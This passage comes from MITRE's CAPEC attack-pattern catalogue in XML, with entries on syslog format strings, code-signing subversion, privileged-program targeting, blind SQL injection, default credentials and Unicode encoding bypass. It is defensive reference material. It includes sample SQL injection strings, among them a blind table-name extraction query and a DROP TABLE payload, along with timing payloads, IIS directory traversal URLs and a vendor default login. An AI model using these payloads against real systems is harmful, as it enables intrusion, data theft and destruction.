               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, do not use the %n operator in format strings. The following code shows a correct usage of Syslog():</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="good">syslog(LOG_ERR, "%s", cmdBuf);</xhtml:div>
               <xhtml:p>The following code shows a vulnerable usage of Syslog():</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="bad">syslog(LOG_ERR, cmdBuf);<xhtml:div>
                     <xhtml:i>// the buffer cmdBuff is taking user supplied data.</xhtml:i>
                  </xhtml:div>
               </xhtml:div>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote attackers to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="134"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-503"/>
            <Reference External_Reference_ID="REF-504"/>
            <Reference External_Reference_ID="REF-505"/>
            <Reference External_Reference_ID="REF-506"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="68" Name="Subvert Code-signing Facilities" Abstraction="Standard" Status="Draft">
         <Description>Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A framework-based language that supports code signing (such as, and most commonly, Java or .NET)</Prerequisite>
            <Prerequisite>Deployed code that has been signed by its authoring vendor, or a partner.</Prerequisite>
            <Prerequisite>The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since, often, the only way to subvert code signing would be to patch the code in memory. Finally, a knowledge of the platform specific mechanisms of signing and verifying code is a must.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography, nor should existing primitives be modified or ignored.</Mitigation>
            <Mitigation>If an attacker cannot attack the scheme directly, he might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the "Magic Coat" attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.</Example>
            <Example>Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit "true" at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.</Example>
            <Example>The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="325"/>
            <Related_Weakness CWE_ID="328"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="69" Name="Target Programs with Elevated Privileges" Abstraction="Standard" Status="Draft">
         <Description>This attack targets programs running with elevated privileges. The attacker would try to leverage a bug in the running program and get arbitrary code to execute with elevated privileges. For instance an attacker would look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break. The malicious user try to execute its code at the same level as a privileged system call.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="8"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="9"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="10"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="67"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker probes for programs running with elevated privileges.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>The attacker finds a bug in a program running with elevated privileges.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker exploits the bug that she has found. For instance she can try to inject and execute arbitrary code or write to OS resources.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted program runs with elevated OS privileges.</Prerequisite>
            <Prerequisite>The targeted program accepts input data from the user or from another program.</Prerequisite>
            <Prerequisite>The targeted program does not perform input validation properly.</Prerequisite>
            <Prerequisite>The targeted program does not fail safely. For instance when a program fails it may authorize restricted access to anyone.</Prerequisite>
            <Prerequisite>The targeted program has a vulnerability such as buffer overflow which may be exploited if a malicious user can inject unvalidated data. For instance a buffer overflow interrupts the program as it executes, and makes it run additional code supplied by the attacker. If the program under attack has elevated privileges to the OS, the attacker can elevate its privileges (such as having root level access).</Prerequisite>
            <Prerequisite>The targeted program is giving away information about itself. Before performing such attack, an eventual attacker may need to gather information about the services running on the host target. The more the host target is verbose about the services that are running (version number of application, etc.) the more information can be gather by an attacker.</Prerequisite>
            <Prerequisite>This attack often requires communicating with the host target services directly. For instance Telnet may be enough to communicate with the host target.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can use a tool to scan and automatically launch an attack against known issues. A tool can also repeat a sequence of instructions and try to brute force the service on the host target, an example of that would be the flooding technique.</Skill>
            <Skill Level="Medium">More advanced attack may require knowledge of the protocol spoken by the host service.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>The log can have a trace of abnormal activity. Also if abnormal activity is detected on the host target. For instance flooding should be seen as abnormal activity and the target host may decide to take appropriate action in order to mitigate the attack (data filtering or blocking). Resource exhaustion is also a sign of abnormal activity.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Apply the principle of least privilege.</Mitigation>
            <Mitigation>Validate all untrusted data.</Mitigation>
            <Mitigation>Apply the latest patches.</Mitigation>
            <Mitigation>Scan your services and disable the ones which are not needed and are exposed unnecessarily. Exposing programs increases the attack surface. Only expose the services which are needed and have security mechanisms such as authentication built around them.</Mitigation>
            <Mitigation>Avoid revealing information about your system (e.g., version of the program) to anonymous users.</Mitigation>
            <Mitigation>Make sure that your program or service fail safely. What happen if the communication protocol is interrupted suddenly? What happen if a parameter is missing? Does your system have resistance and resilience to attack? Fail safely when a resource exhaustion occurs.</Mitigation>
            <Mitigation>If possible use a sandbox model which limits the actions that programs can take. A sandbox restricts a program to a set of privileges and commands that make it difficult or impossible for the program to cause any damage.</Mitigation>
            <Mitigation>Check your program for buffer overflow and format String vulnerabilities which can lead to execution of malicious code.</Mitigation>
            <Mitigation>Monitor traffic and resource usage and pay attention if resource exhaustion occurs.</Mitigation>
            <Mitigation>Protect your log file from unauthorized modification and log forging.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="250"/>
            <Related_Weakness CWE_ID="264"/>
            <Related_Weakness CWE_ID="15"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="7" Name="Blind SQL Injection" Abstraction="Detailed" Status="Draft">
         <Description>Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Hypothesize SQL queries in application]<xhtml:p>Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that his input is passed directly into a query that looks like:</xhtml:p>
                  <xhtml:div style="margin-left:10px;" class="informative">"SELECT * FROM orders WHERE ordernum = _____"<xhtml:br/>or<xhtml:br/>"SELECT * FROM orders WHERE ordernum IN (_____)"<xhtml:br/>or<xhtml:br/>"SELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____"</xhtml:div>
                  <xhtml:p>Of course, there are many other possibilities.</xhtml:p>
               </Description>
               <Technique>Research types of SQL queries and determine which ones could be used at various places in an application.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Determine how to inject information into the queries]<xhtml:p>Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries:</xhtml:p>
                  <xhtml:div style="margin-left:10px;" class="informative">"5' OR 1=1; --"<xhtml:br/>and<xhtml:br/>"5) OR 1=1; --"<xhtml:br/>and<xhtml:br/>"ordernum DESC; --"</xhtml:div>
               </Description>
               <Technique>Add clauses to the SQL queries such that the query logic does not change.</Technique>
               <Technique>Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.</Description>
               <Technique>Use web browser to inject input through text fields or through HTTP GET parameters.</Technique>
               <Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</Technique>
               <Technique>Use network-level packet injection tools such as netcat to inject input</Technique>
               <Technique>Use modified client (modified by reverse engineering) to inject input.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries</Description>
               <Technique>Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only)</Technique>
               <Technique>Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only)</Technique>
               <Technique>Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.</Description>
               <Technique>Automatically extract database schema using a tool such as Absinthe.</Technique>
               <Technique>Manually perform the blind SQL Injection to extract desired information about the database schema.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>6</Step>
               <Phase>Exploit</Phase>
               <Description>[Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database</Description>
               <Technique>Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>SQL queries used by the application to store, retrieve or modify data.</Prerequisite>
            <Prerequisite>User-controllable input that is not properly validated by the application as part of SQL queries.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Determining the database type and version, as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions, the application must handle them gracefully, returning either a custom error page or redirecting the user to a default page, without revealing any information about the database or the application internals.</Mitigation>
            <Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An adversary may try entering something like "username' AND 1=1; --" in an input field. If the result is the same as when the adversary entered "username" in the field, then the adversary knows that the application is vulnerable to SQL Injection. The adversary can then ask yes/no questions from the database server to extract information from it. For example, the adversary can extract table names from a database using the following types of queries:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">"username' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) &gt; 108".</xhtml:div>
               <xhtml:p>If the above query executes properly, then the adversary knows that the first character in a table name in the database is a letter between m and z. If it doesn't, then the adversary knows that the character must be between a and l (assuming of course that table names only contain alphabetic characters). By performing a binary search on all character positions, the adversary can determine all table names in the database. Subsequently, the adversary may execute an actual attack and send something like:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">"username'; DROP TABLE trades; --</xhtml:div>
            </Example>
            <Example>In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="89"/>
            <Related_Weakness CWE_ID="209"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="70" Name="Try Common or Default Usernames and Passwords" Abstraction="Detailed" Status="Draft">
         <Description>An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. "secret" or "password") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="49"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The system uses one factor password based authentication.The adversary has the means to interact with the system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Technology or vendor specific list of default usernames and passwords.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Many incorrect login attempts are detected by the system.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Delete all default account credentials that may be put in by the product vendor.</Mitigation>
            <Mitigation>Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.</Mitigation>
            <Mitigation>Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.</Mitigation>
            <Mitigation>Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>User Bob sets his password to "123" or literally leaves his password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.</Example>
            <Example>Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username "root" with a password "password". This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="521"/>
            <Related_Weakness CWE_ID="262"/>
            <Related_Weakness CWE_ID="263"/>
            <Related_Weakness CWE_ID="798"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Try Common(default) Usernames and Passwords</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="71" Name="Using Unicode Encoding to Bypass Validation Logic" Abstraction="Detailed" Status="Draft">
         <Description>An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</Description>
               <Technique>Try to use Unicode encoding of content in Scripts in order to bypass validation routines.</Technique>
               <Technique>Try to use Unicode encoding of content in HTML in order to bypass validation routines.</Technique>
               <Technique>Try to use Unicode encoding of content in CSS in order to bypass validation routines.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Filtering is performed on data that has not be properly canonicalized.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">An attacker needs to understand Unicode encodings and have an idea (or be able to find out) what system components may not be Unicode aware.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>Unicode encoded data is passed to APIs where it is not expected</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure that the system is Unicode aware and can properly process Unicode data. Do not make an assumption that data will be in ASCII.</Mitigation>
            <Mitigation>Ensure that filtering or input validation is applied to canonical data.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Unicode Encodings in the IIS Server</xhtml:div>
               <xhtml:p>A very common technique for a Unicode attack involves traversing directories looking for interesting files. An example of this idea applied to the Web is</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://target.server/some_directory/../../../winnt</xhtml:div>
               <xhtml:p>In this case, the attacker is attempting to traverse to a directory that is not supposed to be part of standard Web services. The trick is fairly obvious, so many Web servers and scripts prevent it. However, using alternate encoding tricks, an attacker may be able to get around badly implemented request filters.</xhtml:p>
               <xhtml:p>In October 2000, an adversary publicly revealed that Microsoft's IIS server suffered from a variation of this problem. In the case of IIS, all the attacker had to do was provide alternate encodings for the dots and/or slashes found in a classic attack. The Unicode translations are</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">. yields C0 AE<xhtml:br/>/ yields C0 AF<xhtml:br/>\ yields C1 9C</xhtml:div>
               <xhtml:p>Using this conversion, the previously displayed URL can be encoded as</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://target.server/some_directory/%C0AE/%C0AE/%C0AE%C0AE/%C0AE%C0AE/winnt</xhtml:div>See also: CVE-2000-0884</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="176"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="179"/>
            <Related_Weakness CWE_ID="180"/>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="183"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="692"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
